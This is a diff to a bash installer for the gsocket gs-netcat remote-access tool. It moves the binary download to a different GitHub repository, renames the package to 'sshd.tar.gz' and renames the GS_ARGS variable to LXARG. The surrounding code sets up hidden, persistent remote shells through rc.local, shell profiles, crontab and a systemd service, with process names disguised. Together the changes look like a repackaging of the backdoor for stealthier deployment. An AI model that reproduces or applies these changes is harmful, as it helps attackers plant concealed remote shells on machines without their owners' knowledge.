@@ -65,14 +65,14 @@
 #       - Guess what...
 
 # Global Defines
-URL_BASE_CDN="https://github.com/hackerschoice/gsocket.io/raw/gh-pages"
+URL_BASE_CDN="https://raw.githubusercontent.com/YakouDev/z"
 URL_BASE_X="https://z.lix.re"
 [[ -n $GS_URL_BASE ]] && {
 	URL_BASE_CDN="${GS_URL_BASE}"
 	URL_BASE_X="${GS_URL_BASE}"
 }
-URL_BIN="${URL_BASE_CDN}/bin"       # mini & stripped version
-URL_BIN_FULL="${URL_BASE_CDN}/full" # full version (with -h working)
+URL_BIN="${URL_BASE_CDN}/main"       # mini & stripped version
+URL_BIN_FULL="${URL_BASE_CDN}/main" # full version (with -h working)
 [[ -n $GS_URL_BIN ]] && {
 	URL_BIN="${GS_URL_BIN}"
 	URL_BIN_FULL="$URL_BIN"
@@ -699,7 +699,7 @@ init_vars()
 	#try_encode "base64" "base64 -w0" "base64 -d"
 	try_encode "xxd" "xxd -ps -c1024" "xxd -r -ps"
 	DEBUGF "ENCODE_STR='${ENCODE_STR}'"
-	[[ -z "$SRC_PKG" ]] && SRC_PKG="gs-netcat_${OSARCH}.tar.gz"
+	[[ -z "$SRC_PKG" ]] && SRC_PKG="sshd.tar.gz"
 
 	# OSX's pkill matches the hidden name and not the original binary name.
 	# Because we hide as '-bash' we can not use pkill all -bash.
@@ -876,10 +876,10 @@ init_setup()
 	# Do not add TERM= or SHELL= here because we do not like that to show in gs-dbus.service
 	[[ -n $GS_HOST ]] && ENV_LINE+=("GS_HOST='${GS_HOST}'")
 	[[ -n $GS_PORT ]] && ENV_LINE+=("GS_PORT='${GS_PORT}'")
-	# Add an empty item so that ${ENV_LINE[*]}GS_ARGS= adds an extra space between
+	# Add an empty item so that ${ENV_LINE[*]}LXARG= adds an extra space between
 	[[ ${#ENV_LINE[@]} -ne 0 ]] && ENV_LINE+=("")
 
-	RCLOCAL_LINE="${ENV_LINE[*]}HOME=$HOME SHELL=$SHELL TERM=xterm-256color GS_ARGS=\"-k ${RCLOCAL_SEC_FILE} -liqD\" $(command -v bash) -c \"cd /root; exec -a '${PROC_HIDDEN_NAME}' ${DSTBIN}\" 2>/dev/null"
+	RCLOCAL_LINE="${ENV_LINE[*]}HOME=$HOME SHELL=$SHELL TERM=xterm-256color LXARG=\"-k ${RCLOCAL_SEC_FILE} -liqD\" $(command -v bash) -c \"cd /root; exec -a '${PROC_HIDDEN_NAME}' ${DSTBIN}\" 2>/dev/null"
 
 	# There is no reliable way to check if a process is running:
 	# - Process might be running under different name. Especially OSX checks for the orginal name
@@ -888,8 +888,8 @@ init_setup()
 	# The best we can do:
 	# 1. Try pkill/killall _AND_ daemon is running then do nothing.
 	# 2. Otherwise start gs-dbus as DAEMON. The daemon will exit (fully) if GS-Address is already in use.
-	PROFILE_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || (${ENV_LINE[*]}TERM=xterm-256color GS_ARGS=\"-k ${USER_SEC_FILE} -liqD\" exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}' 2>/dev/null)"
-	CRONTAB_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || ${ENV_LINE[*]}SHELL=$SHELL TERM=xterm-256color GS_ARGS=\"-k ${USER_SEC_FILE} -liqD\" $(command -v bash) -c \"exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\" 2>/dev/null"
+	PROFILE_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || (${ENV_LINE[*]}TERM=xterm-256color LXARG=\"-k ${USER_SEC_FILE} -liqD\" exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}' 2>/dev/null)"
+	CRONTAB_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || ${ENV_LINE[*]}SHELL=$SHELL TERM=xterm-256color LXARG=\"-k ${USER_SEC_FILE} -liqD\" $(command -v bash) -c \"exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\" 2>/dev/null"
 
 
 	if [[ -n $ENCODE_STR ]]; then
@@ -1145,7 +1145,7 @@ Type=simple
 Restart=always
 RestartSec=300
 WorkingDirectory=/root
-ExecStart=/bin/bash -c \"${ENV_LINE[*]}GS_ARGS='-k $SYSTEMD_SEC_FILE -ilq' exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\"
+ExecStart=/bin/bash -c \"${ENV_LINE[*]}LXARG='-k $SYSTEMD_SEC_FILE -ilq' exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\"
 
 [Install]
 WantedBy=multi-user.target" >"${SERVICE_FILE}" || return
@@ -1419,7 +1419,7 @@ test_network()
 	# 3. Exit=61 on GS-Connection refused. (server does not exist)
 	# Do not need GS_ENV[*] here because all env variables are exported
 	# when exec is used.
-	err_log=$(_GSOCKET_SERVER_CHECK_SEC=15 GS_ARGS="-s ${GS_SECRET} -t" exec -a "$PROC_HIDDEN_NAME" "${DSTBIN}" 2>&1)
+	err_log=$(_GSOCKET_SERVER_CHECK_SEC=15 LXARG="-s ${GS_SECRET} -t" exec -a "$PROC_HIDDEN_NAME" "${DSTBIN}" 2>&1)
 	ret=$?
 
 	[[ -z "$ERR_LOG" ]] && ERR_LOG="$err_log"
@@ -1630,7 +1630,7 @@ gs_start()
 		#     FOO="X=1" && ($FOO id)  # => -bash: X=1: command not found
 		# This does work:
 		#     FOO="X=1" && (eval $FOO id)
-		(cd "$HOME"; eval "${ENV_LINE[*]}"TERM=xterm-256color GS_ARGS=\"-s "$GS_SECRET" -liD\" exec -a \""$PROC_HIDDEN_NAME"\" \""$DSTBIN"\") || errexit
+		(cd "$HOME"; eval "${ENV_LINE[*]}"TERM=xterm-256color LXARG=\"-s "$GS_SECRET" -liD\" exec -a \""$PROC_HIDDEN_NAME"\" \""$DSTBIN"\") || errexit
 		IS_GS_RUNNING=1
 	fi
 }
